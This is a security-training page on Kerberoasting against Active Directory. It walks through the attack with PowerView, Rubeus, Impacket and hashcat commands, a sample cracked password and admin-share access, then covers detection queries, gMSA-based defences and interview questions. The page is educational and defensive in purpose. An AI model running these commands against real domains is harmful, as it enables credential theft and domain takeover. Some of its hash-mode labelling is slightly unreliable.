# 05 — Kerberoasting

> **Section:** 05 — AD Attack Techniques  
> **Difficulty:** Intermediate  
> **Protocol exploited:** Kerberos (Service Ticket encryption)  
> **Privilege required:** Any domain user account

---

## 📌 What is Kerberoasting?

Kerberoasting exploits a fundamental design choice in Kerberos: **any authenticated domain user can request a service ticket for any SPN**, and that ticket is encrypted with the **service account's password hash**.

An attacker requests these tickets, takes them offline, and cracks the hash to recover the service account's password.

> **Why it is dangerous:** Requires NO special privileges — any domain user can do it. Service accounts often have weak passwords that haven't been changed in years. Service accounts often have high privileges (Domain Admin "for convenience").

---

## ⚙️ Step-by-Step Attack

```
Step 1: Find Kerberoastable accounts (service accounts with SPNs)

  PowerView:
  Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, pwdlastset

  Output:
  Name          SPN                              PasswordLastSet
  ----          ---                              ---------------
  svc_backup    backup/server01.company.local    2020-03-15  ← 4 years old!
  svc_sql       MSSQLSvc/sqlserver01:1433        2023-06-01
  svc_webapp    HTTP/webapp.company.local        2024-01-10

Step 2: Request service tickets for all SPNs

  Method A — Rubeus (most common):
  Rubeus.exe kerberoast /outfile:hashes.txt /rc4opsec

  Method B — Invoke-Kerberoast (PowerShell):
  Import-Module .\PowerView.ps1
  Invoke-Kerberoast -OutputFormat Hashcat | Out-File hashes.txt

  Method C — Impacket (from Linux):
  python3 GetUserSPNs.py company.local/hareesh:password \
      -dc-ip 192.168.1.10 -request -outputfile hashes.txt

  The tickets are in Hashcat format:
  $krb5tgs$23$*svc_backup$COMPANY.LOCAL$backup/server01.company.local*$...
  (Mode 23 = RC4 encrypted — weakest, fastest to crack)
  (Mode 18200 = AES256 encrypted — stronger, much slower to crack)

Step 3: Crack hashes offline with Hashcat

  RC4 (type 23 — most common, fastest):
  hashcat -m 13100 hashes.txt rockyou.txt
  hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule

  AES256 (type 18200 — stronger):
  hashcat -m 19700 hashes.txt rockyou.txt

  Results:
  $krb5tgs$23$*svc_backup*...: Backup2020! ← CRACKED in 8 minutes

Step 4: Authenticate as svc_backup
  net use \\DC01\C$ /user:company\svc_backup Backup2020!
  
  svc_backup is in Domain Admins → full domain access ✅
```

---

## 🔍 Detection

```
Event ID 4769 — Kerberos Service Ticket Requested
  Normal pattern:  User requests tickets for services they actually use
  Kerberoasting:   Many 4769 events in short time, RC4 encryption type

  Key indicators:
  → TicketEncryptionType: 0x17 (RC4-HMAC) — suspicious on modern environments
  → Large number of service ticket requests from single source in short time
  → Requests for service accounts (not computer accounts)

KQL for Sentinel:
  SecurityEvent
  | where EventID == 4769
  | where TicketEncryptionType == "0x17"
  | where ServiceName !endswith "$"  ← exclude computer accounts
  | summarize count() by Account, IpAddress, bin(TimeGenerated, 10m)
  | where count_ > 5
  | order by count_ desc

Defender for Identity:
  → "Suspected Kerberos service ticket request (Kerberoasting)" alert
```

---

## 🛡️ Defence

```
Priority 1: Use gMSA for ALL service accounts
  gMSA passwords = 240-bit random, auto-rotated every 30 days
  Hash cannot be cracked in any reasonable time ✅
  Even if ticket captured → useless
  
  Convert existing service account to gMSA:
  New-ADServiceAccount -Name "svc_backup_gMSA" \
      -DNSHostName "backup.company.local" \
      -PrincipalsAllowedToRetrieveManagedPassword "Backup-Servers" \
      -ManagedPasswordIntervalInDays 30

Priority 2: Set long random passwords on legacy service accounts
  Minimum 25 characters, fully random
  Use a password manager to generate and store
  
  Set-ADAccountPassword -Identity "svc_backup" \
      -NewPassword (ConvertTo-SecureString (New-Guid).ToString() -AsPlainText -Force)

Priority 3: Enforce AES encryption — disable RC4
  Set-ADUser -Identity "svc_backup" -KerberosEncryptionType AES256
  
  AES256 tickets are significantly harder to crack
  (RC4 tickets crack in minutes; AES256 tickets take days/weeks for same password)

Priority 4: Remove unnecessary SPNs
  setspn -L svc_backup  ← check SPNs
  setspn -D old/spn svc_backup  ← remove unused SPNs

Priority 5: Remove excessive privileges from service accounts
  svc_backup should NEVER be in Domain Admins
  Minimum necessary permissions only
  
Priority 6: Monitor Event ID 4769 for RC4 requests
```

---

## 🎯 Interview Questions

**Q1. What is Kerberoasting and what privilege does it require?**  
**A:** Kerberoasting requests Kerberos service tickets for accounts with Service Principal Names (SPNs) and cracks them offline to recover the service account's password. It requires only a valid domain user account — no special privileges. Any authenticated user can request service tickets for any SPN by design, since applications need this ability. The tickets are encrypted with the service account's password hash, which can be brute-forced offline.

**Q2. Why are service accounts particularly vulnerable to Kerberoasting?**  
**A:** Several reasons: passwords are often set once and never changed (some unchanged for years), the password was often set by a human (weak and predictable), many service accounts have high privileges like Domain Admin "for convenience," and the Kerberoasting process is silent and leaves minimal logs. A service account with a 4-year-old password and Domain Admin rights is the ideal Kerberoasting target.

**Q3. How does gMSA specifically prevent Kerberoasting?**  
**A:** gMSA (Group Managed Service Accounts) generates 240-bit random passwords automatically rotated every 30 days. Even if an attacker captures the service ticket (which is encrypted with the password hash), the 240-bit password is computationally impossible to crack with current technology. Hashcat at 1 billion guesses per second would take longer than the age of the universe. The password rotation also means that even if somehow cracked, it expires within 30 days.

---

*"Kerberoasting is the gift that keeps on giving to attackers — free service tickets from any domain user, crackable offline with no alerts. The fix is simple: gMSA. The reason it remains common: operational inertia. Update your service accounts."*
